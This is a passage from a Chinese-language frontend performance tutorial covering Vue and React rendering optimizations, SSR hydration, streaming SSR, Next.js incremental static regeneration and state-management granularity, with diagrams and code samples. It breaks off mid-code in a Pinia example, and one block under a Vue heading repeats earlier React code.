&lt;Suspense&gt;<br>        &lt;!-- 异步组件容器 --&gt;<br>        &lt;component :is=&quot;Component&quot; /&gt;<br>        <br>        &lt;!-- 加载状态 --&gt;<br>        &lt;template #fallback&gt;<br>          &lt;LoadingIndicator /&gt;<br>        &lt;/template&gt;<br>      &lt;/Suspense&gt;<br>    &lt;/KeepAlive&gt;<br>  &lt;/RouterView&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>// 异步组件注册<br>const ProductList = defineAsyncComponent(() =&gt; <br>  import(&#x27;./ProductList.vue&#x27;)<br>)<br>const UserProfile = defineAsyncComponent(&#123;<br>  loader: () =&gt; import(&#x27;./UserProfile.vue&#x27;),<br>  loadingComponent: ProfileSkeleton<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>最佳实践组合</strong></p><ul><li>静态内容：v-once 用于页眉&#x2F;页脚等不变区域</li><li>动态模块：defineAsyncComponent + Suspense 实现按需加载</li><li>高频切换：KeepAlive 缓存标签页&#x2F;弹窗等组件</li><li>缓存管理：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主动清除缓存</span><br><span class="hljs-keyword">import</span> &#123; getCurrentInstance &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> instance = <span class="hljs-title function_">getCurrentInstance</span>()<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetCache</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-comment">// 清除UserProfile缓存</span><br>      instance.<span class="hljs-property">appContext</span>.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$keepAliveStore</span><br>        .<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;UserProfile&#x27;</span>)<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>与 React 优化对比</strong></p><table><thead><tr><th align="left">技术</th><th align="left">Vue</th><th align="left">React</th><th align="left">等效方案</th></tr></thead><tbody><tr><td align="left">静态优化</td><td align="left">v-once</td><td align="left">React.memo</td><td align="left">避免重渲染</td></tr><tr><td align="left">按需加载</td><td align="left">defineAsyncComponent</td><td align="left">React.lazy</td><td align="left">代码分割</td></tr><tr><td align="left">组件缓存</td><td align="left">KeepAlive</td><td align="left">无内置等效</td><td align="left">需手动实现</td></tr><tr><td align="left">加载状态</td><td align="left">Suspense</td><td align="left">Suspense</td><td align="left">占位符方案</td></tr></tbody></table><h3 id="Angular：Change-Detection策略、Pure-Pipes"><a href="#Angular：Change-Detection策略、Pure-Pipes" class="headerlink" title="Angular：Change Detection策略、Pure Pipes"></a>Angular：Change Detection策略、Pure Pipes</h3><h2 id="4-2-SSR-SSG优化"><a href="#4-2-SSR-SSG优化" class="headerlink" title="4.2 SSR&#x2F;SSG优化"></a>4.2 SSR&#x2F;SSG优化</h2><h3 id="水合（Hydration）性能瓶颈分析"><a href="#水合（Hydration）性能瓶颈分析" class="headerlink" title="水合（Hydration）性能瓶颈分析"></a>水合（Hydration）性能瓶颈分析</h3><p><strong>水合机制核心原理</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant DOM  participant JavaScript    Note over Client, JavaScript: 1. 初始加载  Client->>DOM: 接收静态HTML（SSR输出）  DOM->>Client: 快速显示非交互界面    Note over Client, JavaScript: 2. 水合启动  JavaScript->>DOM: 扫描DOM节点  DOM->>JavaScript: 返回节点信息    Note over Client, JavaScript: 3. 重建关联  JavaScript->>JavaScript: 重新创建组件实例  JavaScript->>DOM: 绑定事件监听器  JavaScript->>DOM: 关联内部状态    Note over Client, JavaScript: 4. 完成转换  JavaScript->>Client: 静态页面→可交互应用</pre><p>技术本质：</p><ul><li>将服务器渲染的静态HTML与客户端JavaScript逻辑关联</li><li>重建组件树状态&#x2F;事件绑定，使页面可交互</li><li>关键步骤：DOM节点遍历 → VDOM匹配 → 事件绑定 → 状态注入</li></ul><p><strong>水合优化路线图</strong></p><pre class="mermaid">flowchart LR  A[识别瓶颈] --> B{问题类型}  B --> C[DOM节点过多] --> C1[代码分割/懒加载]  B --> D[事件绑定慢] --> D1[事件委托/延迟绑定]  B --> E[数据不匹配] --> E1[统一渲染逻辑]  B --> F[请求阻塞] --> F1[异步数据获取]  B --> G[库不兼容] --> G1[动态导入]  B --> H[内存泄漏] --> H1[资源清理]    C1 & D1 & E1 & F1 & G1 & H1 --> I[水合完成时间<200ms]</pre><p><strong>关键结论</strong></p><p>水合瓶颈的本质是主线程过载，优化核心是减少不可中断的同步操作。通过节点精简、异步解耦和渐进加载，可提升交互就绪速度 50-300%。</p><h3 id="流式渲染（Streaming-SSR）"><a href="#流式渲染（Streaming-SSR）" class="headerlink" title="流式渲染（Streaming SSR）"></a>流式渲染（Streaming SSR）</h3><p><strong>传统SSR vs 流式SSR架构对比</strong></p><pre class="mermaid">graph LR  A[传统SSR] --> B[请求]  B --> C[服务器获取数据]  C --> D[渲染完整HTML]  D --> E[发送HTML]  E --> F[客户端显示]    G[流式SSR] --> H[请求]  H --> I[立即发送HTML框架]  I --> J[服务器并行获取数据]  J --> K[流式传输内容块]  K --> L[客户端渐进渲染]</pre><p>核心差异：</p><table><thead><tr><th align="left">维度</th><th align="left">传统SSR</th><th align="left">流式SSR</th></tr></thead><tbody><tr><td align="left">响应方式</td><td align="left">全有或全无</td><td align="left">分块渐进传输</td></tr><tr><td align="left">TTFB</td><td align="left">高（等所有数据）</td><td align="left">极低（立即发送框架）</td></tr><tr><td align="left">LCP</td><td align="left">依赖完整HTML</td><td align="left">优先渲染关键内容</td></tr><tr><td align="left">资源加载</td><td align="left">最后阶段加载</td><td align="left">早期并行加载</td></tr></tbody></table><p><strong>技术实现原理</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant Server  participant DB    Client->>Server: 请求页面  Server->>Client: 立即发送HTML框架+占位符    par 并行处理    Server->>DB: 查询关键数据    Server->>DB: 查询次要数据  end    Server->>Client: 发送关键内容块  Client->>Client: 渲染关键内容    Server->>Client: 发送次要内容块  Client->>Client: 渲染次要内容    Server->>Client: 发送结束标记  Client->>Client: 完成渲染</pre><p>关键步骤：</p><p>(1) 响应头设置：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br></code></pre></td></tr></table></figure><p>(2) 内容分块传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 初始框架 --&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>  &lt;head&gt;...&lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div id=&quot;header&quot;&gt;...&lt;/div&gt;<br>    &lt;!-- 内容占位符 --&gt;<br>    <br>&lt;!-- 数据块1 --&gt;<br>&lt;script&gt;appendToDOM(&quot;content&quot;, &quot;&lt;div&gt;首屏数据...&lt;/div&gt;&quot;)&lt;/script&gt;<br><br>&lt;!-- 数据块2 --&gt;<br>&lt;script&gt;appendToDOM(&quot;footer&quot;, &quot;&lt;div&gt;推荐内容...&lt;/div&gt;&quot;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>React18+实现方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 服务端代码 (Node.js)</span><br><span class="hljs-keyword">import</span> &#123; renderToPipeableStream &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/server&#x27;</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/stream&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; pipe &#125; = <span class="hljs-title function_">renderToPipeableStream</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>,<br>    &#123;<br>      <span class="hljs-attr">bootstrapScripts</span>: [<span class="hljs-string">&#x27;/main.js&#x27;</span>],<br>      <span class="hljs-title function_">onShellReady</span>(<span class="hljs-params"></span>) &#123;<br>        res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>);<br>        <span class="hljs-title function_">pipe</span>(res); <span class="hljs-comment">// 开始流式传输</span><br>      &#125;,<br>      <span class="hljs-title function_">onError</span>(<span class="hljs-params">error</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;渲染错误:&#x27;</span>, error);<br>      &#125;<br>    &#125;<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 客户端代码</span><br><span class="hljs-keyword">import</span> &#123; hydrateRoot &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/client&#x27;</span>;<br><br><span class="hljs-title function_">hydrateRoot</span>(<span class="hljs-variable language_">document</span>, <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br></code></pre></td></tr></table></figure><p><strong>Vue3 实现方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 服务端代码 (Vite SSR)</span><br><span class="hljs-keyword">import</span> &#123; renderToWebStream &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue/server-renderer&#x27;</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/stream&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);<br>  <span class="hljs-keyword">const</span> stream = <span class="hljs-title function_">renderToWebStream</span>(app);<br>  <br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>);<br>  stream.<span class="hljs-title function_">pipe</span>(res);<br>&#125;);<br><br><span class="hljs-comment">// 客户端激活</span><br><span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#app&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="部分静态生成（Incremental-Static-Regeneration）"><a href="#部分静态生成（Incremental-Static-Regeneration）" class="headerlink" title="部分静态生成（Incremental Static Regeneration）"></a>部分静态生成（Incremental Static Regeneration）</h3><p><strong>ISR 核心概念</strong></p><pre class="mermaid">graph LR  A[传统SSG] --> B[构建时生成所有页面]  B --> C[内容更新需全站重建]    D[ISR] --> E[构建时生成关键页面]  E --> F[按需生成其他页面]  F --> G[定时/触发更新单个页面]</pre><p>技术定义：</p><ul><li>静态生成（SSG）：构建时预渲染完整HTML</li><li>部分静态生成（ISR）：<ul><li>首次访问时生成静态页面</li><li>按需更新过期页面</li><li>更新时不中断当前请求</li></ul></li></ul><p><strong>工作原理</strong></p><pre class="mermaid">sequenceDiagram  participant User  participant CDN  participant Server    User->>CDN: 请求 /product/123  alt 页面已缓存且未过期    CDN->>User: 立即返回静态HTML  else 页面过期/不存在    CDN->>Server: 请求重新生成    Server->>Server: 增量构建页面    Server->>CDN: 返回新HTML + 更新缓存    CDN->>User: 返回新内容    Server->>Background: 触发后台重建  end</pre><p><strong>Next.js 实现方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/products/[id].js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params">&#123; params &#125;</span>) &#123;<br>  <span class="hljs-comment">// 获取产品数据</span><br>  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProduct</span>(params.<span class="hljs-property">id</span>);<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; product &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// 60秒后页面过期</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 预生成热门产品页</span><br>  <span class="hljs-keyword">const</span> hotProducts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getHotProducts</span>();<br>  <span class="hljs-keyword">const</span> paths = hotProducts.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> (&#123; <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">id</span>: p.<span class="hljs-property">id</span> &#125; &#125;));<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    paths,<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span>, <span class="hljs-comment">// 其他产品按需生成</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductPage</span>(<span class="hljs-params">&#123; product &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;product.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键配置参数</strong></p><table><thead><tr><th align="left">参数</th><th align="left">类型</th><th align="left">默认值</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">revalidate</td><td align="left">秒数</td><td align="left">false</td><td align="left">页面刷新间隔</td></tr><tr><td align="left">fallback</td><td align="left">boolean&#x2F;string</td><td align="left">false</td><td align="left">未生成页面的行为</td></tr><tr><td align="left">fallback: true</td><td align="left">-</td><td align="left">-</td><td align="left">显示fallback UI → 后台生成</td></tr><tr><td align="left">fallback: ‘blocking’</td><td align="left">-</td><td align="left">-</td><td align="left">用户等待直到页面生成完成</td></tr><tr><td align="left">unstable_revalidate</td><td align="left">函数</td><td align="left">-</td><td align="left">手动触发重新生成</td></tr></tbody></table><p><strong>更新触发机制</strong></p><p>(1) 时间驱动：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">revalidate</span>: <span class="hljs-number">3600</span> <span class="hljs-comment">// 每小时检查更新</span><br></code></pre></td></tr></table></figure><p>(2) 事件驱动：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// API路由：手动触发重新生成</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">unstable_revalidate</span>(<span class="hljs-string">&#x27;/product/123&#x27;</span>)<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">revalidated</span>: <span class="hljs-literal">true</span> &#125;)<br>&#125;<br><br><span class="hljs-comment">// CMS更新回调</span><br>cms.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;product-update&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/revalidate?id=<span class="hljs-subst">$&#123;id&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>(3) 按访问刷新：</p><pre class="mermaid">graph LR  A[用户访问] --> B{页面是否过期?}  B -->|是| C[后台生成新版本]  B -->|否| D[返回缓存]  C --> E[下次访问生效]</pre><p><strong>缓存优化策略</strong></p><pre class="mermaid">graph TB  A[用户请求] --> B[CDN边缘缓存]  B -->|HIT| C[返回缓存]  B -->|MISS| D[源站ISR服务]  D --> E{页面存在?}  E -->|是| F[验证过期]  F -->|未过期| G[返回缓存]  F -->|已过期| H[后台重建]  E -->|否| I[同步生成]  H & I --> J[更新CDN]  J --> K[返回用户]</pre><h2 id="4-3-状态管理优化"><a href="#4-3-状态管理优化" class="headerlink" title="4.3 状态管理优化"></a>4.3 状态管理优化</h2><h3 id="局部状态-vs-全局状态粒度控制"><a href="#局部状态-vs-全局状态粒度控制" class="headerlink" title="局部状态 vs 全局状态粒度控制"></a>局部状态 vs 全局状态粒度控制</h3><p><strong>核心概念解析</strong></p><pre class="mermaid">graph TD  A[状态管理] --> B[局部状态]  A --> C[全局状态]    B --> B1[组件内部useState]  B --> B2[组件props传递]  C --> C1[Context API]  C --> C2[Redux/Zustand]    D[优化目标] --> E[精准更新]  D --> F[避免过度渲染]</pre><p>技术定义：</p><ul><li>局部状态：仅在单个组件内部使用的状态（影响范围：1个组件）</li><li>全局状态：被多个组件共享的状态（影响范围：N个组件）</li><li>粒度控制：根据状态使用范围选择最佳存储位置</li></ul><p><strong>状态选择决策</strong></p><pre class="mermaid">flowchart TD  A[新状态] --> B{使用范围}  B -->|单个组件| C[局部状态]  B -->|2-3个紧密关联组件| D[提升状态到父组件]  B -->|跨多层级/多个功能模块| E[全局状态]  C --> F[useState/useReducer]  D --> G[Props传递]  E --> H[Context/Redux/Pinia]</pre><p><strong>React 实现方案</strong></p><p>(1) 局部状态优化</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 纯局部状态：仅影响本组件</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125;&gt;</span><br><span class="language-xml">        Clicked &#123;count&#125; times</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 状态提升</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 状态提升：影响子组件</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeSwitcher</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setTheme&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 精准全局状态</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 创建细粒度Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserPrefsContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 分离关注点：避免单个大状态对象</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [fontSize, setFontSize] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">16</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserPrefsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">fontSize</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPrefsContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 消费端精准订阅</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserPrefsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Vue 实现方案</strong></p><p>(1) 局部状态</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 创建细粒度Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserPrefsContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 分离关注点：避免单个大状态对象</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [fontSize, setFontSize] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">16</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserPrefsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">fontSize</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPrefsContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 消费端精准订阅</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserPrefsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 状态提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;!-- Parent.vue --&gt;<br>&lt;template&gt;<br>  &lt;ChildA :value=&quot;sharedState&quot; /&gt;<br>  &lt;ChildB @update=&quot;sharedState = $event&quot; /&gt;<br>&lt;/template&gt;<br><br>&lt;script setup&gt;<br>const sharedState = ref(&#x27;&#x27;); // 父子共享状态<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(3) 精准全局状态（Pinia）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// stores/user.js (Pinia store)</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">&#x27;user&#x27;</span>, &#123;<br>  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">theme</span>: <span 